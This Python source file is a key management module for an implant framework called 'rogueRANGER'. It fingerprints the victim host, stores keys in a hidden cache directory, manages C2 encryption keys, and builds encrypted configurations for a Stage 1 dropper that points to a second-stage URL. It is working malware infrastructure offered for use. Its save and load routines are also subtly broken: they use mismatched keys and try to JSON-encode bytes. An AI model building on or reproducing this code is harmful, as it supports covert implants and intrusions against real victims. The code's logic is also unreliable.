#!/usr/bin/env python3
"""
Key Management System for rogueRANGER
Per-implant unique key generation and management
"""

import os
import sys
import json
import base64
import hashlib
import time
import uuid
from datetime import datetime, timedelta
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization

class KeyManager:
    """
    Manages encryption keys for implants and C2 communications
    Features:
    - Per-implant unique key generation
    - Key rotation and expiration
    - Secure key storage and retrieval
    - Public/private key pairs for C2
    """
    
    def __init__(self, implant_id=None):
        self.implant_id = implant_id or self.generate_implant_id()
        self.keys = {}
        self.key_rotation_interval = 86400  # 24 hours
        self.load_or_generate_keys()
    
    def generate_implant_id(self):
        """Generate unique implant identifier"""
        # Combine system information for uniqueness
        system_info = []
        
        try:
            # Hostname
            import platform
            system_info.append(platform.node())
            
            # MAC address (first interface)
            import psutil
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == psutil.AF_LINK:
                        system_info.append(addr.address)
                        break
                if len(system_info) > 1:
                    break
            
            # Disk ID if available
            if os.path.exists('/etc/machine-id'):
                with open('/etc/machine-id', 'r') as f:
                    system_info.append(f.read().strip())
            
        except Exception as e:
            print(f"[KEY] Error collecting system info: {e}")
        
        # Fallback to UUID
        if not system_info:
            system_info.append(str(uuid.uuid4()))
        
        # Create hash-based ID
        implant_id = hashlib.sha256(':'.join(system_info).encode()).hexdigest()[:16]
        print(f"[KEY] Generated implant ID: {implant_id}")
        return implant_id
    
    def load_or_generate_keys(self):
        """Load existing keys or generate new ones"""
        key_file = self.get_key_file_path()
        
        if os.path.exists(key_file):
            try:
                self.load_keys(key_file)
                print(f"[KEY] Loaded existing keys for {self.implant_id}")
            except Exception as e:
                print(f"[KEY] Failed to load keys: {e}")
                self.generate_new_keys()
        else:
            self.generate_new_keys()
            self.save_keys(key_file)
    
    def generate_new_keys(self):
        """Generate complete set of encryption keys"""
        print("[KEY] Generating new key set...")
        
        # 1. Master symmetric key (for C2 communications)
        self.keys['master_symmetric'] = {
            'key': Fernet.generate_key(),
            'created': time.time(),
            'expires': time.time() + self.key_rotation_interval
        }
        
        # 2. Payload encryption key
        self.keys['payload_encryption'] = {
            'key': Fernet.generate_key(),
            'created': time.time(),
            'expires': time.time() + (self.key_rotation_interval * 7)  # 7 days
        }
        
        # 3. Generate RSA key pair for secure key exchange
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        
        public_key = private_key.public_key()
        
        # Serialize keys
        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        
        public_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        
        self.keys['rsa_private'] = {
            'key': private_pem,
            'created': time.time(),
            'expires': time.time() + (self.key_rotation_interval * 30)  # 30 days
        }
        
        self.keys['rsa_public'] = {
            'key': public_pem,
            'created': time.time(),
            'expires': time.time() + (self.key_rotation_interval * 30)
        }
        
        # 4. Derive implant-specific key from system fingerprint
        system_fingerprint = self.get_system_fingerprint()
        derived_key = self.derive_implant_key(system_fingerprint)
        
        self.keys['implant_specific'] = {
            'key': derived_key,
            'created': time.time(),
            'expires': None  # Never expires (tied to hardware)
        }
        
        print("[KEY] Key generation complete")
    
    def get_system_fingerprint(self):
        """Generate system fingerprint for key derivation"""
        fingerprint_data = []
        
        try:
            import platform
            import psutil
            
            # System information
            fingerprint_data.append(platform.node())  # Hostname
            fingerprint_data.append(platform.machine())  # Architecture
            fingerprint_data.append(platform.processor())  # CPU
            
            # Network interfaces
            mac_addresses = []
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == psutil.AF_LINK:
                        mac_addresses.append(addr.address)
            
            if mac_addresses:
                fingerprint_data.append(':'.join(sorted(mac_addresses)))
            
            # CPU info
            if os.path.exists('/proc/cpuinfo'):
                with open('/proc/cpuinfo', 'r') as f:
                    cpuinfo = f.read()
                    # Extract CPU model
                    for line in cpuinfo.split('\n'):
                        if line.startswith('model name'):
                            fingerprint_data.append(line.split(':')[1].strip())
                            break
            
            # Memory size
            memory = psutil.virtual_memory()
            fingerprint_data.append(str(memory.total))
            
        except Exception as e:
            print(f"[KEY] Error collecting fingerprint: {e}")
            # Fallback
            fingerprint_data.append(str(uuid.getnode()))
            fingerprint_data.append(str(time.time()))
        
        fingerprint = ':'.join(fingerprint_data)
        print(f"[KEY] System fingerprint hash: {hashlib.sha256(fingerprint.encode()).hexdigest()[:16]}")
        
        return fingerprint.encode()
    
    def derive_implant_key(self, fingerprint, salt=b'rogueRANGER_implant_salt'):
        """Derive implant-specific key from system fingerprint"""
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(fingerprint))
        return key
    
    def get_key_file_path(self):
        """Get path for key storage file"""
        # Store in hidden directory
        hidden_dir = os.path.expanduser("~/.cache/.rogue_keys")
        os.makedirs(hidden_dir, exist_ok=True)
        
        key_file = os.path.join(hidden_dir, f"{self.implant_id}.keys")
        return key_file
    
    def save_keys(self, key_file):
        """Save keys to encrypted file"""
        try:
            # Encrypt keys before saving
            master_key = self.keys['master_symmetric']['key']
            fernet = Fernet(master_key)
            
            # Prepare data for encryption
            key_data = {
                'implant_id': self.implant_id,
                'keys': self.keys,
                'saved': time.time()
            }
            
            encrypted_data = fernet.encrypt(json.dumps({
                'keys': self.keys,
                'saved': time.time()
            }).encode())
            
            # Write to file
            with open(key_file, 'wb') as f:
                f.write(encrypted_data)
            
            # Set restrictive permissions
            os.chmod(key_file, 0o600)
            
            print(f"[KEY] Keys saved to {key_file}")
            
        except Exception as e:
            print(f"[KEY] Failed to save keys: {e}")
    
    def load_keys(self, key_file):
        """Load keys from encrypted file"""
        try:
            # First, need to decrypt with master key
            # Master key is stored separately or derived
            with open(key_file, 'rb') as f:
                encrypted_data = f.read()
            
            # Try to derive master key from system fingerprint
            system_fingerprint = self.get_system_fingerprint()
            derived_key = self.derive_implant_key(system_fingerprint)
            
            fernet = Fernet(derived_key)
            decrypted_data = fernet.decrypt(encrypted_data)
            
            key_data = json.loads(decrypted_data.decode('utf-8'))
            self.keys = key_data['keys']
            
            print(f"[KEY] Keys loaded from {key_file}")
            
        except Exception as e:
            print(f"[KEY] Failed to load keys: {e}")
            raise
    
    def get_key(self, key_type, check_expiry=True):
        """Get key of specified type"""
        if key_type not in self.keys:
            print(f"[KEY] Key type not found: {key_type}")
            return None
        
        key_info = self.keys[key_type]
        
        # Check if key has expired
        if check_expiry and key_info.get('expires'):
            if time.time() > key_info['expires']:
                print(f"[KEY] Key expired: {key_type}")
                self.rotate_key(key_type)
                key_info = self.keys[key_type]  # Get new key
        
        return key_info['key']
    
    def rotate_key(self, key_type):
        """Rotate/regenerate a specific key"""
        print(f"[KEY] Rotating key: {key_type}")
        
        if key_type == 'master_symmetric':
            self.keys[key_type] = {
                'key': Fernet.generate_key(),
                'created': time.time(),
                'expires': time.time() + self.key_rotation_interval
            }
        
        elif key_type == 'payload_encryption':
            self.keys[key_type] = {
                'key': Fernet.generate_key(),
                'created': time.time(),
                'expires': time.time() + (self.key_rotation_interval * 7)
            }
        
        elif key_type in ['rsa_private', 'rsa_public']:
            # Generate new RSA pair
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048
            )
            
            if key_type == 'rsa_private':
                private_pem = private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption()
                )
                
                self.keys['rsa_private'] = {
                    'key': private_pem,
                    'created': time.time(),
                    'expires': time.time() + (self.key_rotation_interval * 30)
                }
                
                # Update public key too
                public_key = private_key.public_key()
                public_pem = public_key.public_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PublicFormat.SubjectPublicKeyInfo
                )
                
                self.keys['rsa_public'] = {
                    'key': public_pem,
                    'created': time.time(),
                    'expires': time.time() + (self.key_rotation_interval * 30)
                }
        
        # Save updated keys
        self.save_keys(self.get_key_file_path())
        print(f"[KEY] Key rotation complete: {key_type}")
    
    def encrypt_data(self, data, key_type='master_symmetric'):
        """Encrypt data with specified key"""
        try:
            key = self.get_key(key_type)
            if not key:
                return None
            
            fernet = Fernet(key)
            
            if isinstance(data, str):
                data = data.encode('utf-8')
            
            encrypted = fernet.encrypt(data)
            return encrypted
            
        except Exception as e:
            print(f"[KEY] Encryption failed: {e}")
            return None
    
    def decrypt_data(self, encrypted_data, key_type='master_symmetric'):
        """Decrypt data with specified key"""
        try:
            key = self.get_key(key_type)
            if not key:
                return None
            
            fernet = Fernet(key)
            decrypted = fernet.decrypt(encrypted_data)
            
            # Try to decode as string
            try:
                return decrypted.decode('utf-8')
            except:
                return decrypted
                
        except Exception as e:
            print(f"[KEY] Decryption failed: {e}")
            return None
    
    def get_public_key_pem(self):
        """Get public key in PEM format"""
        return self.get_key('rsa_public')
    
    def get_private_key_pem(self):
        """Get private key in PEM format"""
        return self.get_key('rsa_private')
    
    def rsa_encrypt(self, data, public_key_pem=None):
        """Encrypt data with RSA public key"""
        try:
            if public_key_pem is None:
                public_key_pem = self.get_public_key_pem()
            
            public_key = serialization.load_pem_public_key(public_key_pem)
            
            if isinstance(data, str):
                data = data.encode('utf-8')
            
            encrypted = public_key.encrypt(
                data,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            
            return base64.b64encode(encrypted).decode('utf-8')
            
        except Exception as e:
            print(f"[KEY] RSA encryption failed: {e}")
            return None
    
    def rsa_decrypt(self, encrypted_data_b64):
        """Decrypt data with RSA private key"""
        try:
            private_key_pem = self.get_private_key_pem()
            private_key = serialization.load_pem_private_key(
                private_key_pem,
                password=None
            )
            
            encrypted_data = base64.b64decode(encrypted_data_b64)
            
            decrypted = private_key.decrypt(
                encrypted_data,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            
            try:
                return decrypted.decode('utf-8')
            except:
                return decrypted
                
        except Exception as e:
            print(f"[KEY] RSA decryption failed: {e}")
            return None
    
    def generate_c2_config(self, stage2_url):
        """Generate encrypted C2 configuration for dropper"""
        config = {
            'stage2_url': stage2_url,
            'encryption_key': self.get_key('payload_encryption'),
            'implant_id': self.implant_id,
            'public_key': self.get_public_key_pem().decode('utf-8'),
            'timestamp': time.time(),
            'ttl': 86400  # 24 hours
        }
        
        # Encrypt with implant-specific key
        encrypted_config = self.encrypt_data(
            json.dumps(config),
            'implant_specific'
        )
        
        return encrypted_config
    
    def check_key_health(self):
        """Check health of all keys and rotate if needed"""
        print("[KEY] Checking key health...")
        
        rotations_needed = []
        for key_type, key_info in self.keys.items():
            if key_info.get('expires'):
                time_remaining = key_info['expires'] - time.time()
                
                if time_remaining <= 0:
                    rotations_needed.append(key_type)
                elif time_remaining < 3600:  # Less than 1 hour
                    print(f"[KEY] Key expiring soon: {key_type} ({time_remaining:.0f}s)")
        
        # Rotate expired keys
        for key_type in rotations_needed:
            self.rotate_key(key_type)
        
        return len(rotations_needed) > 0

# Utility functions
def generate_dropper_config(implant_id, stage2_url):
    """Generate configuration for Stage 1 dropper"""
    km = KeyManager(implant_id)
    return km.generate_c2_config(stage2_url)

def test_key_system():
    """Test the key management system"""
    print("[KEY TEST] Starting key system test...")
    
    # Create key manager
    km = KeyManager("test_implant_001")
    
    # Test encryption/decryption
    test_data = "This is a test message for rogueRANGER"
    
    # Symmetric encryption
    encrypted = km.encrypt_data(test_data)
    decrypted = km.decrypt_data(encrypted)
    
    assert decrypted == test_data, "Symmetric encryption test failed"
    print("[KEY TEST] Symmetric encryption: PASS")
    
    # RSA encryption
    rsa_encrypted = km.rsa_encrypt(test_data)
    rsa_decrypted = km.rsa_decrypt(rsa_encrypted)
    
    assert rsa_decrypted == test_data, "RSA encryption test failed"
    print("[KEY TEST] RSA encryption: PASS")
    
    # Key rotation test
    old_key = km.get_key('master_symmetric')
    km.rotate_key('master_symmetric')
    new_key = km.get_key('master_symmetric')
    
    assert old_key != new_key, "Key rotation test failed"
    print("[KEY TEST] Key rotation: PASS")
    
    print("[KEY TEST] All tests passed!")
    return True

if __name__ == "__main__":
    test_key_system()